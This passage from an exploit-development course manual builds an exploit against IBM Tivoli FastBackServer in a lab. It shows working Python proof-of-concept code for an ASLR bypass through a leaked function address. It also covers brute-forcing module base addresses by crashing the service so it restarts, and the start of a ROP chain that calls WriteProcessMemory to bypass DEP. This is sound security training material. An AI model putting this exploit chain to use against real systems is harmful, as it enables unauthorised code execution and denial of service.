EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
457 
The IP address is represented as a structure of type in_addr, while the port is specified as an 
unsigned word. 
As shown in Listing 546, the in_addr structure359 represents the IP address with each octet as a 
single byte. We can obtain the IP address from the second DWORD returned by 
FX_AGENT_S_GetConnectedIpPort. 
0:077> dd ebp-61BC L1 
0dbb9cdc  7877a8c0 
 
0:005> ? c0;? a8;? 77;? 78 
Evaluate expression: 192 = 000000c0 
Evaluate expression: 168 = 000000a8 
Evaluate expression: 119 = 00000077 
Evaluate expression: 120 = 00000078 
Listing 546 - Locating the IP address 
If each of the bytes are translated from hexadecimal to decimal in reverse order, they reveal the IP 
address our of Kali Linux machine (192.168.119.120). 
We can also reverse the order of the DWORD and convert it to decimal to reveal the port number, 
as shown below. 
0:077> dd ebp-12550 L1 
0dbad948  000020d0 
 
0:077> ? d020 
Evaluate expression: 53280 = 0000d020 
Listing 547 - Locating the port number 
Let’s verify our findings by opening a command prompt with administrative permissions on the 
Windows 10 student machine and using the netstat command to list the TCP connections. We’ll 
supply the -anbp flag to show only TCP connections. 
C:\Windows\system32> netstat -anbp tcp 
 
Active Connections 
 
  Proto  Local Address          Foreign Address        State 
... 
  TCP    192.168.120.10:11406  0.0.0.0:0              LISTENING 
 [FastBackServer.exe] 
  TCP    192.168.120.10:11460  0.0.0.0:0              LISTENING 
 [FastBackServer.exe] 
  TCP    192.168.120.10:11460  192.168.119.120:53280  CLOSE_WAIT 
 [FastBackServer.exe] 
... 
Listing 548 - From the output we find the existing TCP connection 
Listing 548 shows that our Kali machine at 192.168.119.120 has an active TCP connection to the 
Windows 10 client on port 53280, confirming the information we found in WinDbg. This is 
 
359 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/winsock2/ns-winsock2-in_addr 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
458 
promising, as we are hoping to receive the output of FXCLI_DebugDispatch through a network 
packet, and the most logical way to do this from the application perspective is to reuse the TCP 
connection we created to send our request. 
Let’s continue verifying our hypothesis by attempting to locate a function that transmits data. 
After the code providing the IP address and TCP port number, there are a series of checks on the 
values retrieved by FX_AGENT_S_GetConnectedIpPort. After reaching the basic block shown in 
Figure 163, we locate the function FXCLI_IF_Buffer_Send. 
 
Figure 163: Call to FXCLI_IF_Buffer_Send 
This function name suggests that some data will be sent over the network. Combined with the 
check for an active connection to our Kali machine, we can guess that the data supplied to this 
function will be sent to us as a network packet. 
Let’s continue our dynamic analysis by single-stepping until the call to FXCLI_IF_Buffer_Send. 
Then we’ll dump the contents of the first function argument. 
eax=00ede3a8 ebx=0608c418 ecx=04fd0020 edx=0000009e esi=0608c418 edi=00669360 
eip=00575d2d esp=0db5e324 ebp=0dbbfe98 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
FastBackServer!FXCLI_OraBR_Exec_Command+0x9877: 
00575d2d e8817d0000      call    FastBackServer!FXCLI_IF_Buffer_Send (0057dab3) 
 
0:077> da poi(esp) 
00ede3a8  "XpressServer: SymbolOperation .-" 
00ede3c8  "------------------------------ ." 
00ede3e8  "Value of [WriteProcessMemory] is" 
00ede408  ": ..Address is: 0x75342890 .Flag" 
00ede428  "s are: 0x207 .Size is : 0x20 ." 
Listing 549 - Output from FXCLI_DebugDispatch as an argument 
The text string containing the address of WriteProcessMemory that was returned by 
FXCLI_DebugDispatch is supplied as an argument to FXCLI_IF_Buffer_Send. 
To confirm data transmission, we could go into the call in search of a call to send. However, it’s 
much easier to instead modify our proof of concept. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
459 
We can update our proof of concept to receive data after sending a request packet as shown in 
Listing 550. 
def main(): 
    if len(sys.argv) != 2: 
        print("Usage: %s <ip_address>\n" % (sys.argv[0])) 
        sys.exit(1) 
     
    server = sys.argv[1] 
    port = 11460 
 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    s.connect((server, port)) 
 
    s.send(buf) 
 
   response = s.recv(1024) 
    print(response) 
 
    s.close() 
 
    print("[+] Packet sent") 
    sys.exit(0) 
Listing 550 - Proof of concept receiving data 
Listing 550 shows that the proof of concept will print any data received through the recv method 
to the console. 
To confirm our hypothesis, we’ll remove all the breakpoints in WinDbg, let the execution continue, 
and run the updated proof of concept. 
kali@kali:~$ python3 poc.py 192.168.120.10 
b'\x00\x00\x00\x9eXpressServer: SymbolOperation \n------------------------------- 
\nValue of [WriteProcessMemory] is: \n\nAddress is: 0x75342890 \nFlags are: 0x207 
\nSize is : 0x20 \n' 
[+] Packet sent 
Listing 551 - Receiving FXCLI_DebugDispatch output 
Listing 551 shows that we have received the output from FXCLI_DebugDispatch, which includes 
the address for WriteProcessMemory. At this point we have implemented a rudimentary ASLR 
bypass. Excellent! 
Finally, we’ll filter the data to only print the address. We can do this by searching for the string 
“Address is:”, as shown in Listing 552. 
def parseResponse(response): 
    """ Parse a server response and extract the leaked address """ 
    pattern = b"Address is:" 
    address = None 
    for line in response.split(b"\n"): 
       if line.find(pattern) != -1: 
          address = int((line.split(pattern)[-1].strip()),16) 
    if not address: 
       print("[-] Could not find the address in the Response") 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
460 
       sys.exit() 
    return address 
Listing 552 - Updated proof of concept to filter the address 
To make the code more readable and modular, we placed the parsing code inside a separate 
function called parseResponse. 
Inside this method, we locate the address by splitting the response by newlines and searching for 
the “Address is:” string. 
Once the string is found, our code extracts the address and converts it to hexadecimal. 
Finally, we’ll call parseResponse from the main method, supply the response packet as an 
argument, and print the results to the console. 
kali@kali:~$ python3 poc.py 192.168.120.10 
0x75342890 
[+] Packet sent 
Listing 553 - Results from running the updated proof of concept 
Listing 553 shows that we received the clean address of WriteProcessMemory. 
Occasionally, when running our proof of concept, we fail to resolve the address of 
WriteProcessMemory. This is why the parseResponse method checks for a populated address 
variable. If our proof of concept fails, as it does in Listing 554, we can rerun it until it succeeds. 
kali@kali:~$ python3 poc.py 192.168.120.10 
[-] Could not find the address in the Response 
Listing 554 - Failed to resolve address of WriteProcessMemory 
In this section, we have leveraged a logical vulnerability into an ASLR bypass. 
An ASLR bypass like the one we found may be combined with a memory corruption vulnerability 
to obtain code execution by overcoming both ASLR and DEP. We’ll explore these steps in the next 
section. 
10.2.3.1 Exercises 
1. 
Repeat the analysis to trace our packet after the call to SymGetSymFromName. 
2. 
Update the proof of concept to obtain the address of WriteProcessMemory. 
3. 
Execute the exploit without WinDbg attached. Can you still bypass ASLR? 
10.3 Expanding our Exploit (ASLR Bypass) 
In previous sections, we managed to locate a suspicious Win32 API imported by FastBackServer 
that led to an information disclosure. This leak provides a direct ASLR bypass by resolving and 
returning the address of any exported function. 
When we resolved the address of WriteProcessMemory, it also gave us a pointer to kernel32.dll, 
meaning we could use that DLL to locate ROP gadgets. Unfortunately, since every monthly update 
changes the ROP gadget offsets, our exploit would become dependent on the patch level of 
Windows. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
461 
We can create a better exploit by leaking the address of a function from one of the IBM modules 
shipped with FastBackServer, meaning our exploit will only be dependent on the version of Tivoli. 
In the next sections, we will locate a pointer to an IBM module that we can use for ROP gadgets 
to bypass DEP. As part of the exploit development process, we will also overcome various 
complications we will encounter. 
10.3.1 
Leaking an IBM Module 
In order to proceed, we must first select a good candidate IBM module for our gadgets. To do 
this, we’ll determine the name of the loaded modules as well as their location on the filesystem. 
Once we decide which module to use, we will leak the address of an exported function using the 
logical vulnerability. Finally, using the leaked address, we’ll gather the base address of the IBM 
module in order to build our ROP chain dynamically. 
Let’s start by enumerating all loaded IBM modules in the process. We can do this in WinDbg by 
first breaking execution and then using the lm command along with the f flag to list the file paths. 
0:077> lm f 
start    end        module name 
00190000 001cd000   SNFS     C:\Program Files\Tivoli\TSM\FastBack\server\SNFS.dll 
001d0000 001fd000   libcclog C:\Program Files\Tivoli\TSM\FastBack\server\libcclog.dll 
00400000 00c0c000   FastBackServer C:\Program 
Files\Tivoli\TSM\FastBack\server\FastBackServer.exe 
00c10000 00c47000   CSNCDAV6 C:\Program Files\Tivoli\TSM\FastBack\server\CSNCDAV6.DLL 
00c50000 00c82000   CSMTPAV6 C:\Program Files\Tivoli\TSM\FastBack\server\CSMTPAV6.DLL 
01060000 010d7000   CSFTPAV6 C:\Program Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL 
010e0000 01113000   snclientapi C:\Program 
Files\Tivoli\TSM\FastBack\server\snclientapi.dll 
013f0000 01432000   NLS      C:\Program Files\Tivoli\TSM\FastBack\Common\NLS.dll 
01550000 0157b000   gsk8iccs C:\Program Files\ibm\gsk8\lib\gsk8iccs.dll 
015c0000 015fa000   icclib019 C:\Program Files\ibm\gsk8\lib\N\icc\icclib\icclib019.dll 
03240000 03330000   libeay32IBM019 C:\Program 
Files\ibm\gsk8\lib\N\icc\osslib\libeay32IBM019.dll 
... 
Listing 555 - Loaded IBM modules for FastBackServer 
The output in Listing 555 reveals ten IBM DLLs and the FastBackserver executable. 
Next, we need to select a module with an exported function we can resolve that contains 
desirable gadgets. We must ensure it does not contain 0x00 in the uppermost byte of the base 
address, which excludes the use of FastBackServer.exe. 
Multiple 
modules 
meet 
these 
requirements, 
so we’ll 
start 
by 
arbitrarily 
choosing 
libeay32IBM019.dll, located in C:\Program Files\ibm\gsk8\lib\N\icc\osslib. 
Next, we need to locate the function we want to resolve. Let’s copy libeay32IBM019.dll to our Kali 
Linux machine and load it into IDA Pro. 
Once IDA Pro has completed its analysis, we can navigate to the Export tab and pick any function 
that does not contain a bad character. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
462 
 
Figure 164: N98E_CRYPTO_get_net_lockid is exported by libeay32IBM019 
In our case, we’ll use the N98E_CRYPTO_get_net_lockid function, which can be found as the first 
entry when sorting by Address in IDA Pro (Figure 164). 
This function is located at offset 0x14E0 inside the module. Once we leak the function address, 
we’ll need to subtract that offset to get the base address of the DLL. 
Listing 556 displays an updated proof of concept that implements this logic. 
# psCommandBuffer 
symbol = b"SymbolOperationN98E_CRYPTO_get_new_lockid" + b"\x00" 
buf += symbol + b"A" * (100 - len(symbol)) 
buf += b"B" * 0x100 
buf += b"C" * 0x100 
 
# Checksum 
buf = pack(">i", len(buf)-4) + buf 
 
def main(): 
    if len(sys.argv) != 2: 
        print("Usage: %s <ip_address>\n" % (sys.argv[0])) 
        sys.exit(1) 
     
    server = sys.argv[1] 
    port = 11460 
 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    s.connect((server, port)) 
 
    s.send(buf) 
 
    response = s.recv(1024) 
    FuncAddr = parseResponse(response) 
    libeay32IBM019Base = FuncAddr - 0x14E0 
    print(str(hex(libeay32IBM019Base))) 
 
    s.close() 
 
    print("[+] Packet sent") 
    sys.exit(0) 
 
if __name__ == "__main__": 
    main() 
Listing 556 - Proof of concept to leak the base address of libeay32IBM019B 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
463 
We can test our updated exploit by continuing execution within WinDbg and launching our proof 
of concept. Our exploit’s results are shown below. 
kali@kali:~$ python3 poc.py 192.168.120.10                                          
0x03240000                                                                              
[+] Packet sent   
Listing 557 - Leaking the base address of libeay32IBM019 
We have successfully leaked the base address of the IBM module. Very nice! 
Next, we need to locate gadgets within it that we can use for a ROP chain to bypass DEP. Bad 
characters can be problematic at this point, so we’ll deal with these in the next section. 
10.3.1.1 Exercises 
1. 
Implement a proof of concept to leak the base address of libeay32IBM019. 
2. 
Modify the proof of concept to leak the base address of a different IBM module. 
3. 
Use rp++ to generate a file containing gadgets. 
4. 
Modify the proof of concept to be more modular with a separate function (leakFuncAddr) for 
leaking the address of a given symbol. Use that to leak the address of both 
WriteProcessMemory and libeay32IBM019. 
10.3.2 
Is That a Bad Character? 
Our current exploit leverages a logical vulnerability to disclose the address of an IBM module’s 
exported function, as well as the module’s base address. Before moving forward with our exploit 
development, we must ensure that the selected module’s base address does not contain bad 
characters. 
In a previous module, we exploited a memory corruption vulnerability triggered through opcode 
0x534 in FastBackServer. We determined during exploit development that the characters 0x00, 
0x09, 0x0A, 0x0C, 0x0D, and 0x20 break our exploit by truncating the buffer. 
The vulnerability is present due to unsanitized input to the scanf call. Since we will be leveraging 
that vulnerability again, we need to avoid the same bad characters in our updated exploit. 
Keeping this in mind, we can start by checking for bad characters in the base address of the 
selected module. We can do this by executing the ASLR disclosure multiple times across 
application restarts and inspecting the upper two bytes of the module base address. 
After multiple tests, we observe that there is a small risk that the base address of libeay32IBM019 
will contain a bad character due to ASLR randomization. 
One such occurrence is illustrated in Listing 558. 
kali@kali:~$ python3 poc.py 192.168.120.10 
0x3200000 
[+] Packet sent 
Listing 558 - Finding bad characters in base address of libeay32IBM019 
In the listing above, the second-to-highest byte contains the value 0x20, which is a bad character. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
464 
If we use this base address to set up a ROP chain, along with the relevant gadget offsets, the bad 
character will truncate the buffer and the exploit attempt will fail. We must pick a different 
module, or risk a denial-of-service condition while trying to leverage the vulnerability. In our case, 
we may have another option. 
To provide greater reliability, some server-side enterprise suites run a service that monitors its 
applications, and can take action if one of them crashes. If the service detects a crash, it will 
restart the process, ensuring that the application remains accessible. 
When the process restarts, ASLR will randomize the base address of the module. This provides 
an opportunity for the attacker, as there is a chance that the new randomized address is clean. 
Since we can typically “restart” the application an arbitrary number of times, we can effectively 
perform a brute force attack until we encounter a good address. 
The associated services for Tivoli are shown in Figure 165. 
 
Figure 165: Four services for Tivoli 
The FastBack WatchDog service seems promising as its name suggests some sort of process 
monitoring. 
To verify this, we’ll use Process Monitor360 (ProcMon), which, among other things, can monitor 
process creation. We’ll open ProcMon.exe as an administrator from C:\Tools\SysInternalsSuite 
and navigate to Filter > Filter… to open the process monitor filter window. 
Let’s set up a filter rule by selecting Operation in the first column and contains in the second 
column. We’ll enter “Process” as the term to include, as shown in Figure 166. With this search we 
are filtering entries such as “Process Start”, “Process Exit”, etc. 
 
360 (Microsoft, 2019), https://docs.microsoft.com/en-us/sysinternals/downloads/procmon 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
465 
 
Figure 166: Process Monitor filter 
Once the rule is configured, we’ll Add it, Apply it, and enable it with OK. 
Next, we can observe what happens when FastBackServer crashes. We’ll simulate a crash by 
attaching WinDbg to the process and then closing WinDbg. Eventually, FastBackServer is 
restarted, as shown in Figure 167. 
 
Figure 167: FastBackServer is being restarted automatically 
Once the process restarts, we’ll resend the packet that calls FXCLI_DebugDispatch and observe 
the new base address, which does not contain the bad character. 
kali@kali:~$ python3 poc.py 192.168.120.10 
0x31f0000 
[+] Packet sent 
Listing 559 - Bad characters in base address of libeay32IBM019 are gone 
Excellent! We can get a clean base address for libeay32IBM019 by repeatedly crashing 
FastBackServer, abusing its automatic restart. 
After FastBackServer crashes, the new instance may not be ready to accept 
network connections for several minutes. 
At this point, we’ve bypassed ASLR and dealt with the issue of bad characters. Next, we’ll 
combine these skills and leverage a DEP bypass to obtain code execution. 
10.3.2.1 Exercises 
1. 
Repeat the analysis to identify the automatic process restart. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
466 
2. 
Implement a proof of concept that will leak the base address of libeay32IBM019 and identify 
any bad characters. 
3. 
In the case of bad characters, implement a routine that crashes FastBackServer (using the 
buffer overflow vulnerability triggered with opcode 0x534) and detects when the service is 
back online. 
4. 
Automate the process of brute forcing the bad characters to obtain a clean base address 
that works with the exploit. 
10.4 Bypassing DEP with WriteProcessMemory 
Now that ASLR is taken care of, we need to bypass DEP. In a previous module, we did this by 
modifying the memory protections of the stack where the shellcode resides. 
Earlier, we used VirtualAlloc to bypass DEP. That technique still applies, but we will expand our 
ROP skills by taking a different approach. 
We can copy our shellcode from the stack into a pre-allocated module’s code page through the 
Win32 WriteProcessMemory361 API. 
In our case, we’ll copy our shellcode into the code page of libeay32IBM019. The code page is 
already executable, so we won’t violate DEP when the shellcode is executed from there. 
A typical code page is not writable, but WriteProcessMemory takes care of this by making the 
target memory page writable before the copy, then reverting the memory protections after the 
copy. 
In the next sections we’ll unpack the API’s required arguments and create a ROP chain that calls 
it. 
10.4.1 
WriteProcessMemory 
Our current goal is to abuse WriteProcessMemory to bypass DEP and gain code execution inside 
the code section of libeay32IBM019. However, before we create a ROP chain to call 
WriteProcessMemory, we need to understand what arguments it accepts. 
In Listing 560, we find the function prototype from MSDN. 
BOOL WriteProcessMemory( 
  HANDLE  hProcess, 
  LPVOID  lpBaseAddress, 
  LPCVOID lpBuffer, 
  SIZE_T  nSize, 
  SIZE_T  *lpNumberOfBytesWritten 
); 
Listing 560 - WriteProcessMemory function prototype 
The first argument, hProcess, is a handle to the process we want to interact with. Since we want 
to perform a copy operation inside the current process, we’ll supply a pseudo handle. The pseudo 
 
361 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
467 
handle is a special constant currently set to -1.362 When the API is invoked, it translates the 
pseudo handle to the actual process handle and allows us to effectively ignore this argument. 
The second argument, lpBaseAddress, is the absolute memory address inside the code section 
where we want our shellcode to be copied. In principle, this address could be anywhere inside the 
code section because it has the correct memory protections, but overwriting existing code could 
cause the application to crash. 
To avoid crashing the application, we need to locate unused memory inside the code section and 
copy our shellcode there. When the code for an application is compiled, the code page of the 
resulting binary must be page-aligned. If the compiled opcodes do not exactly fill the last used 
page, it will be padded with null bytes. 
Exploit developers refer to this padded area as a code cave. The easiest way to find a code cave is 
to search for null bytes at the end of a code section’s upper bounds. Let’s begin our search by 
navigating the PE header363 to locate the start of the code pages. 
We’ll use WinDbg to find the code cave, so let’s attach it to FastBackServer and pause execution. 
As we learned in a previous module, we can find the offset to the PE header by dumping the 
DWORD at offset 0x3C from the MZ header. Next, we’ll add 0x2C to the offset to find the offset to 
the code section, as shown in Listing 561. 
0:077> dd libeay32IBM019 + 3c L1 
031f003c  00000108 
 
0:077> dd libeay32IBM019 + 108 + 2c L1 
031f0134  00001000 
 
0:077> ? libeay32IBM019 + 1000 
Evaluate expression: 52367360 = 031f1000 
Listing 561 - Starting address of libeay32IBM019 code page 
Let’s use the !address command to collect information about the code section. 
0:077> !address 031f1000 
 
Usage:                  Image 
Base Address:           031f1000 
End Address:            03283000 
Region Size:            00092000 ( 584.000 kB) 
State:                  00001000          MEM_COMMIT 
Protect:                00000020          PAGE_EXECUTE_READ 
Type:                   01000000          MEM_IMAGE 
Allocation Base:        031f0000 
Allocation Protect:     00000080          PAGE_EXECUTE_WRITECOPY 
... 
Listing 562 - Upper bounds of code section 
 
362 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-
getcurrentprocess 
363 http://aerokid240.blogspot.com/2011/03/windows-and-its-pe-file-structure.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
468 
As highlighted in Listing 562, we’ve obtained the upper bound of the code section. To locate a 
code cave, we can subtract a sufficiently-large value from the upper bound to find unused 
memory large enough to contain our shellcode. 
Instead of parsing the PE header manually, we can use the !dh364 WinDbg 
command to display all the headers. 
To check if a code cave is indeed present, let’s subtract the arbitrary value 0x400, which should be 
large enough for our shellcode, from the upper bound: 
0:077> dd 03283000-400 
03282c00  00000000 00000000 00000000 00000000 
03282c10  00000000 00000000 00000000 00000000 
03282c20  00000000 00000000 00000000 00000000 
03282c30  00000000 00000000 00000000 00000000 
03282c40  00000000 00000000 00000000 00000000 
03282c50  00000000 00000000 00000000 00000000 
03282c60  00000000 00000000 00000000 00000000 
03282c70  00000000 00000000 00000000 00000000 
 
0:077> ? 03283000-400 - libeay32IBM019 
Evaluate expression: 601088 = 00092c00 
 
0:077> !address 03282c00 
 
Usage:                  Image 
Base Address:           031f1000 
End Address:            03283000 
Region Size:            00092000 ( 584.000 kB) 
State:                  00001000          MEM_COMMIT 
Protect:                00000020          PAGE_EXECUTE_READ 
Type:                   01000000          MEM_IMAGE 
Allocation Base:        031f0000 
Allocation Protect:     00000080          PAGE_EXECUTE_WRITECOPY 
Listing 563 - Code cave at offset 0x92c00 
Listing 563 reveals that we have found a code cave that provides 0x400 bytes of memory. In 
addition, the memory protection is PAGE_EXECUTE_READ, as expected. 
The code cave starts at offset 0x92c00 into the module. This offset contains a null byte, so we’ll 
use the offset 0x92c04 instead. 
Summarizing the information we gathered so far, we can use offset 0x92c04 together with the 
leaked module base address as the second argument (lpBaseAddress) to WriteProcessMemory. 
The final three arguments for WriteProcessMemory are simpler. Let’s review the function 
prototype, provided again below. 
 
364 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-dh 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
469 
BOOL WriteProcessMemory( 
  HANDLE  hProcess, 
  LPVOID  lpBaseAddress, 
  LPCVOID lpBuffer, 
  SIZE_T  nSize, 
  SIZE_T  *lpNumberOfBytesWritten 
); 
Listing 564 - WriteProcessMemory function prototype 
Because of the stack overflow, our shellcode will be located on the stack after we trigger the 
vulnerability. Therefore, for the third API argument, we must supply the shellcode’s stack address. 
The fourth argument will be the shellcode size. 
The last argument needs to be a pointer to a writable DWORD where WriteProcessMemory will 
store the number of bytes that were copied. We could use a stack address for this pointer, but it’s 
easier to use an address inside the data section of libeay32IBM019, as we do not have to gather it 
at runtime. 
We can use the !dh365 command to find the data section’s start address, supplying the -a flag to 
dump the name of the module along with all header information. 
0:077> !dh -a libeay32IBM019 
 
File Type: DLL 
FILE HEADER VALUES 
     14C machine (i386) 
       6 number of sections 
49EC08E6 time date stamp Sun Apr 19 22:32:22 2009 
 
       0 file pointer to symbol table 
       0 number of symbols 
      E0 size of optional header 
    2102 characteristics 
            Executable 
            32 bit word machine 
            DLL 
... 
 
SECTION HEADER #4 
   .data name 
    F018 virtual size 
   D5000 virtual address 
    CA00 size of raw data 
   D2000 file pointer to raw data 
       0 file pointer to relocation table 
       0 file pointer to line numbers 
       0 number of relocations 
       0 number of line numbers 
C0000040 flags 
         Initialized Data 
         (no align specified) 
 
365 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-dh 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
470 
         Read Write 
... 
Listing 565 - Enumerating header information 
From Listing 565, we learn that the offset to the data section is 0xD5000, and its size is 0xF018. 
We need to check the contents of the address to ensure they are not being used and to verify 
memory protections. Section headers must be aligned on a page boundary, so let’s dump the 
contents of the address just past the size value. 
0:077> ? libeay32IBM019 + d5000 + f018  + 4 
Evaluate expression: 53297180 = 032d401c 
 
0:077> dd 032d401c 
032d401c  00000000 00000000 00000000 00000000 
032d402c  00000000 00000000 00000000 00000000 
032d403c  00000000 00000000 00000000 00000000 
032d404c  00000000 00000000 00000000 00000000 
032d405c  00000000 00000000 00000000 00000000 
032d406c  00000000 00000000 00000000 00000000 
032d407c  00000000 00000000 00000000 00000000 
032d408c  00000000 00000000 00000000 00000000 
 
0:077> !vprot 032d401c 
BaseAddress:       032d4000 
AllocationBase:    031f0000 
AllocationProtect: 00000080  PAGE_EXECUTE_WRITECOPY 
RegionSize:        00001000 
State:             00001000  MEM_COMMIT 
Protect:           00000004  PAGE_READWRITE 
Type:              01000000  MEM_IMAGE 
 
0:077> ? 032d401c - libeay32IBM019 
Evaluate expression: 933916 = 000e401c 
Listing 566 - Locating offset to unused DWORD in data section 
Listing 566 shows that we found a writable, unused DWORD inside the data section, which is 
exactly what we need. It is located at offset 0xe401c from the base address. 
Now that we know what arguments to supply to WriteProcessMemory, let’s implement a call to 
this API using ROP. 
First, we need to reintroduce the code we previously used to trigger the buffer overflow 
vulnerability in the scanf call (opcode 0x534) into our proof of concept. 
Second, we’ll insert a ROP skeleton consisting of the API address, return address, and arguments 
to use WriteProcessMemory instead of VirtualAlloc. In the previous FastBackServer exploit, we 
used absolute addresses for ROP gadgets, but in this case (because of ASLR), we’ll identify every 
gadget as libeay32IBM019’s base address plus an offset. 
Listing 567 lists the code required to create a ROP skeleton for WriteProcessMemory. 
... 
libeay32IBM019Func = leakFuncAddr(b"N98E_CRYPTO_get_new_lockid", server) 
dllBase = libeay32IBM019Func - 0x14E0 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
471 
print(str(hex(dllBase))) 
 
# Get address of WriteProcessMemory 
WPMAddr = leakFuncAddr(b"WriteProcessMemory", server) 
print(str(hex(WPMAddr))) 
 
# psAgentCommand 
buf = bytearray([0x41]*0xC) 
buf += pack("<i", 0x534)  # opcode 
buf += pack("<i", 0x0)    # 1st memcpy: offset 
buf += pack("<i", 0x700)  # 1st memcpy: size field 
buf += pack("<i", 0x0)    # 2nd memcpy: offset 
buf += pack("<i", 0x100)  # 2nd memcpy: size field 
buf += pack("<i", 0x0)    # 3rd memcpy: offset 
buf += pack("<i", 0x100)  # 3rd memcpy: size field 
buf += bytearray([0x41]*0x8) 
 
# psCommandBuffer 
wpm  = pack("<L", (WPMAddr))               # WriteProcessMemory Address 
wpm += pack("<L", (dllBase + 0x92c04))  # Shellcode Return Address 
wpm += pack("<L", (0xFFFFFFFF))               # pseudo Process handle 
wpm += pack("<L", (dllBase + 0x92c04))  # Code cave address  
wpm += pack("<L", (0x41414141))               # dummy lpBuffer (Stack address)  
wpm += pack("<L", (0x42424242))               # dummy nSize 
wpm += pack("<L", (dllBase + 0xe401c))  # lpNumberOfBytesWritten 
wpm += b"A" * 0x10 
 
offset = b"A" * (276 - len(wpm)) 
... 
Listing 567 - ROP skeleton to call WriteProcessMemory 
As covered in an earlier exercise, we’ll first gather the base address of libeay32IBM019, which 
we’ll store in the dllBase variable. 
Previously, when we used VirtualAlloc without an ASLR bypass, we had to generate and update all 
the function arguments (including the return and API addresses) at runtime with ROP. 
This case is different. Our ASLR bypass resolves the address of WriteProcessMemory along with 
the code cave address, which is both the return address and the destination address for our 
shellcode. The last argument, lpNumberOfBytesWritten, is also calculated as an address inside 
the data section without the help of a ROP gadget. 
As a result, we only need to dynamically update two values with ROP. We’ll update the address of 
the shellcode on the stack (because it changes each time we execute the exploit) and the size of 
the shellcode, avoiding NULL bytes. 
We should note that the 276-byte offset from the start of the buffer (used to 
overwrite EIP) has not changed from the previous module exploit. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
472 
We’ll begin updating these values dynamically by focusing on the shellcode’s dummy value on the 
stack. Repeating an earlier technique, we’ll obtain a copy of ESP in a different register, align it with 
the dummy value on the stack, and overwrite it. 
An excellent candidate is shown in Listing 568. 
0x100408d6: push esp ; pop esi ; ret  
Listing 568 - Gadget to obtain a copy of ESP 
We can use this gadget to cleanly obtain a copy of ESP in ESI. 
From the output of rp++ shown above, we notice that the address of the gadget is 0x100408d6. 
This address is an absolute address, not an offset. Because of ASLR, we cannot directly use this 
address, so we’ll need to calculate the offset. 
When we execute rp++, it parses the DLL’s PE header to obtain the preferred base load address. 
This address will be written as the gadget address in the output file. We’ll use WinDbg to find the 
preferred base load address for libeay32IBM019.dll, and subtract the value of that address from 
each gadget we select in our output file. 
The preferred base load address is called the ImageBase in the PE header and is stored at offset 
0x34. 
0:077> dd libeay32IBM019 + 3c L1 
031f003c  00000108 
 
0:077> dd libeay32IBM019 + 108 + 34 L1 
031f013c  10000000 
Listing 569 - Finding the preferred base load address 
In the case of libeay32IBM019.dll, this turns out to be 0x10000000 as shown in Listing 569. 
The preferred base load address of libeay32IBM019.dll matches the upper most byte in the 
gadget addresses given in the rp++ output. To obtain the offset, we can simply ignore the upper 
0x100 value. 
We are now ready to create the first part of the ROP chain that replaces the dummy stack 
address with the shellcode address. We can use a similar approach we used in a previous module 
but with gadgets from libeay32IBM019.dll. 
The first step is to align the EAX register with the shellcode address on the stack. 
eip = pack("<L", (dllBase + 0x408d6)) # push esp ; pop esi ; ret 
 
# Patching lpBuffer 
rop = pack("<L", (dllBase + 0x296f))    # mov eax, esi ; pop esi ; ret 
rop += pack("<L", (0x42424242))         # junk into esi 
rop += pack("<L", (dllBase + 0x117c))   # pop ecx ; ret 
rop += pack("<L", (0x88888888)) 
